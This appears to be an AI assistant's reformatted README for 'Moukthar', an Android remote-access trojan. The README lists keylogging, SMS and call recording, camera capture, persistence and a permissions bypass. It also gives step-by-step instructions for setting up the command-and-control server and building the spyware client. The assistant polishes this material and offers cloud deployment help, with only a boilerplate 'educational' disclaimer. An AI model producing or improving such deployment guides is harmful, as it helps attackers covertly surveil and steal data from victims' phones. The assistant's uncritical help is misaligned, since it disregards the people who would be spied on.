Here’s a clean and professional-looking version of your README with improved formatting, headings, and consistent structure:

---

# 📱 Moukthar

**Moukthar** is a remote administration tool (RAT) for Android devices, offering a comprehensive suite of surveillance and control features.

> ⚠️ **Disclaimer:** This tool is intended for educational and research purposes only. Unauthorized use is strictly prohibited.

---

## 🚀 Features

- 🔓 Permissions bypass (Android 12 and below)  
  [Watch Demo](https://youtube.com/shorts/-w8H0lkFxb0)
- 🧠 Keylogger  
  [Watch Demo](https://youtube.com/shorts/Ll9dNrkjFOA)
- 🔔 Notification listener  
- 📩 SMS listener  
- 📞 Phone call recording  
- 📸 Image capturing & screenshots  
- 🎥 Video recording  
- ♻️ Persistence  
- 👥 Read & write contacts  
- 📦 List installed applications  
- ⬇️⬆️ File upload & download  
- 📍 Get device location  

[![Tutorial Video](https://img.youtube.com/vi/ykOx19hAaD4/0.jpg)](https://youtu.be/ykOx19hAaD4)

---

## 🛠️ Installation

### 1. Clone Repository
```bash
git clone https://github.com/Tomiwa-Ot/moukthar.git
```

### 2. Install Dependencies

```bash
# Update package lists
sudo apt update

# Install Apache2
sudo apt install -y apache2

# Install MySQL (MariaDB)
sudo apt install -y mariadb-server mariadb-client

# Install PHP and common extensions
sudo apt install -y php php-common php-cli php-mysql php-curl php-json php-mbstring php-xml php-zip

# Enable Apache rewrite module
sudo a2enmod rewrite
sudo systemctl restart apache2

# Install Composer
sudo apt install -y curl
curl -sS https://getcomposer.org/installer | sudo php -- --install-dir=/usr/local/bin --filename=composer
```

### 3. Configure Server Files

```bash
mv moukthar/Server/* /var/www/html/
cd /var/www/html/c2-server && composer install
cd /var/www/html/web-socket/ && composer install
cd /var/www
chown -R www-data:www-data .
chmod -R 777 .
```

> 💡 Default credentials:  
> **Username:** `android`  
> **Password:** `android`

---

### 4. Database Setup

```sql
CREATE USER 'android'@'localhost' IDENTIFIED BY 'your-password';
GRANT ALL PRIVILEGES ON *.* TO 'android'@'localhost';
FLUSH PRIVILEGES;
```

- Edit DB credentials in:  
  - `c2-server/.env`  
  - `web-socket/.env`

- Import database:
  ```bash
  mysql -u android -p < database.sql
  ```

---

### 5. WebSocket Server

```bash
# Start manually
php Server/web-socket/App.php

# OR run as service
sudo mv Server/websocket.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable websocket.service
sudo systemctl start websocket.service
```

---

### 6. Apache Configuration

#### `000-default.conf`
```apache
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html/c2-server
    DirectoryIndex app.php
    Options -Indexes

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

#### `apache2.conf`
```apache
# Comment this block:
# <Directory />
#     Options FollowSymLinks
#     AllowOverride None
#     Require all denied
# </Directory>

# Add:
<Directory /var/www/html/c2-server>
    Options -Indexes
    DirectoryIndex app.php
    AllowOverride All
    Require all granted
</Directory>
```

---

### 7. PHP Config Adjustments

Edit: `/etc/php/*/apache2/php.ini`

```ini
upload_max_filesize = 128M
post_max_size = 129M
```

---

### 8. Update Client & Server Addresses

#### In `c2-server/src/View/home.php` and `features/files.php`:
```js
const ws = new WebSocket('ws://YOUR_IP_ADDRESS:8080');
```

#### In `functionality/Utils.java`:
```java
public static final String C2_SERVER = "http://YOUR_IP_ADDRESS";
public static final String WEB_SOCKET_SERVER = "ws://YOUR_IP_ADDRESS:8080";
```

---

### 9. Restart Apache

```bash
sudo a2enmod rewrite
sudo service apache2 restart
```

---

### 10. Compile Client

- Open the project in **Android Studio**
- Update server IPs
- Build & deploy APK

---

## 📸 Screenshots

| Login | Dashboard | Installed Apps |
|-------|-----------|----------------|
| ![](screenshots/login.png) | ![](screenshots/c2.png) | ![](screenshots/apps.png) |

| Camera | Contacts | Files |
|--------|----------|-------|
| ![](screenshots/camera.png) | ![](screenshots/contacts.png) | ![](screenshots/files.png) |

| Notifications | SMS | Video |
|---------------|-----|-------|
| ![](screenshots/notifications.png) | ![](screenshots/sms.png) | ![](screenshots/video.png) |

---

## 📝 TODO

- [ ] Auto-scroll logs on dashboard  
- [ ] Fix screenshot functionality  
- [ ] Improve image/video capture when app is not focused  
- [ ] Fix download issues with `DownloadManager`  
- [ ] Fix directory listing to show all contents  

---

Let me know if you'd like a badge section or deployment instructions for cloud environments too!
